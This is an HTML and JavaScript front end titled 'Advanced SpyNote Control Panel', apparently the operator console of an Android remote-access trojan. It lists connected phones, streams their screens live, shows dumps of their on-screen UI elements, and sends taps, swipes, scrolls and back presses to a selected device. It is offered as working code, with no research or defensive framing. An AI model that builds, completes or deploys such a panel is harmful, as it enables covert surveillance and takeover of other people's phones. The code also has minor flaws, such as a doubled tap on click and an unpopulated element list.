<!DOCTYPE html>
<html>
<head>
    <title>üì± Advanced SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #sidebar {
            position: fixed; top: 0; left: 0; width: 300px; height: 100vh; 
            background: rgba(15,15,35,0.95); backdrop-filter: blur(20px);
            padding: 20px; overflow-y: auto;
        }
        #devices { margin-bottom: 20px; }
        .device { padding: 15px; margin: 10px 0; background: rgba(50,50,80,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.3s; 
            border: 1px solid rgba(0,255,136,0.3); }
        .device:hover { background: rgba(0,255,136,0.2); transform: translateX(5px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
        
        #controls-panel { background: rgba(20,20,40,0.9); padding: 15px; border-radius: 12px; margin-top: 20px; }
        .control-btn { padding: 12px 20px; margin: 5px; border: none; border-radius: 8px; 
            cursor: pointer; font-weight: bold; transition: all 0.3s; width: 100%; }
        .tap-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a52); color: white; }
        .swipe-btn { background: linear-gradient(45deg, #4ecdc4, #44a08d); color: white; }
        .scroll-btn { background: linear-gradient(45deg, #45b7d1, #96c93d); color: white; }
        .back-btn { background: linear-gradient(45deg, #f093fb, #f5576c); color: white; }
        .control-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
        
        #phone-container {
            position: fixed; right: 20px; top: 50%; transform: translateY(-50%);
            width: 420px; height: 880px; background: #000; 
            border: 30px solid #1a1a1a; border-radius: 60px; 
            box-shadow: 0 30px 60px rgba(0,0,0,0.7);
        }
        #screen { width: 100%; height: 100%; background: #111; 
            border-radius: 35px; image-rendering: pixelated; cursor: crosshair;
            position: relative;
        }
        .ui-element { 
            position: absolute; border: 2px solid rgba(0,255,136,0.6); 
            background: rgba(0,255,136,0.1); pointer-events: none;
            transition: all 0.2s; font-size: 11px; padding: 2px;
        }
        .ui-element:hover { border-color: #00ff88; background: rgba(0,255,136,0.3); }
        
        #status-bar { position: fixed; top: 10px; right: 20px; 
            background: rgba(0,0,0,0.8); padding: 15px; border-radius: 10px; }
        #fps { color: #00ff88; }
        #ui-dump { position: fixed; bottom: 20px; right: 20px; 
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 10px;
            max-height: 300px; overflow-y: auto; max-width: 350px; display: none; }
        .ui-item { padding: 8px; margin: 4px 0; background: rgba(50,50,80,0.5); 
            border-radius: 6px; cursor: pointer; font-size: 12px; }
        .ui-item:hover { background: rgba(0,255,136,0.3); }
    </style>
</head>
<body>
    <div id="sidebar">
        <div id="devices">
            <h3>üì± Connected Devices</h3>
            <div id="device-list">Loading...</div>
        </div>
        <div id="controls-panel">
            <h4>üéÆ Quick Controls</h4>
            <button class="control-btn tap-btn" onclick="quickTap()">üëÜ Quick Tap</button>
            <button class="control-btn swipe-btn" onclick="quickSwipe()">‚ÜïÔ∏è Quick Swipe</button>
            <button class="control-btn scroll-btn" onclick="quickScroll()">üìú Scroll Down</button>
            <button class="control-btn back-btn" onclick="sendBack()">üîô Back</button>
        </div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div>UI Elements: <span id="elementCount">0</span></div>
    </div>
    
    <div id="ui-dump">
        <h4>üéØ UI Elements</h4>
        <div id="ui-list"></div>
    </div>

    <div id="phone-container">
        <canvas id="screen"></canvas>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let uiElements = [];
        let canvas, ctx, phoneContainer;
        
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const elementCount = document.getElementById('elementCount');
        const uiDump = document.getElementById('ui-dump');
        const uiList = document.getElementById('ui-list');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            renderScreen(data);
        });

        socket.on('ui-dump', (data) => {
            if (data.deviceId !== currentDevice) return;
            uiElements = data.elements || [];
            renderUIElements();
            elementCount.textContent = uiElements.length;
        });

        function renderScreen(data) {
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                canvas.width = phoneContainer.clientWidth;
                canvas.height = phoneContainer.clientHeight;
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                renderUIElements();
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        }

        function renderUIElements() {
            // Clear previous elements
            ctx.save();
            ctx.font = '12px Arial';
            ctx.strokeStyle = 'rgba(0,255,136,0.8)';
            ctx.lineWidth = 2;
            ctx.fillStyle = 'rgba(0,255,136,0.9)';
            
            uiElements.forEach(el => {
                const rect = phoneContainer.getBoundingClientRect();
                const x = (el.bounds[0] / deviceWidth) * canvas.width;
                const y = (el.bounds[1] / deviceHeight) * canvas.height;
                const w = ((el.bounds[2] - el.bounds[0]) / deviceWidth) * canvas.width;
                const h = ((el.bounds[3] - el.bounds[1]) / deviceHeight) * canvas.height;
                
                ctx.strokeRect(x, y, w, h);
                ctx.fillText(el.text?.substring(0,15) || el.className || 'Element', x+5, y+15);
            });
            ctx.restore();
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${!info.connected ? 'disconnected' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <b>${info.model || id.slice(0,8)}</b><br>
                    <small>${info.brand} Android ${info.version}</small><br>
                    ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                </div>
            `).join('') || 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
            uiDump.style.display = 'block';
        }

        // Perfect touch/mouse mapping
        let isDragging = false, dragStart = {x:0, y:0};
        canvas = document.getElementById('screen');
        ctx = canvas.getContext('2d');
        phoneContainer = document.getElementById('phone-container');

        function getDeviceCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            return {
                x: Math.floor(((clientX - rect.left) / rect.width) * deviceWidth),
                y: Math.floor(((clientY - rect.top) / rect.height) * deviceHeight)
            };
        }

        phoneContainer.addEventListener('click', (e) => {
            const coords = getDeviceCoords(e.clientX, e.clientY);
            sendControl('tap', coords.x, coords.y);
            quickTap(coords.x, coords.y);
        });

        phoneContainer.addEventListener('mousedown', (e) => {
            isDragging = true;
            dragStart = getDeviceCoords(e.clientX, e.clientY);
        });

        phoneContainer.addEventListener('mousemove', (e) => {
            if (!isDragging || !currentDevice) return;
            const coords = getDeviceCoords(e.clientX, e.clientY);
            sendControl('swipe', dragStart.x, dragStart.y, coords.x, coords.y);
        });

        phoneContainer.addEventListener('mouseup', () => {
            isDragging = false;
        });

        // Quick controls
        function quickTap(x=540, y=960) { sendControl('tap', x, y); }
        function quickSwipe() { 
            sendControl('swipe', 540, 300, 540, 1600); // Full screen swipe
        }
        function quickScroll() { 
            sendControl('scroll', 540, 1600, 540, 300); // Scroll up
        }
        function sendBack() { sendControl('back'); }
        function sendControl(action, x=0, y=0, ex=0, ey=0) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action, x, y, endX: ex, endY: ey });
        }

        // UI Element clicking
        uiList.addEventListener('click', (e) => {
            const target = e.target.closest('.ui-item');
            if (target) {
                const index = parseInt(target.dataset.index);
                const el = uiElements[index];
                sendControl('tap', el.bounds[0] + 50, el.bounds[1] + 50);
            }
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);
    </script>
</body>
</html>
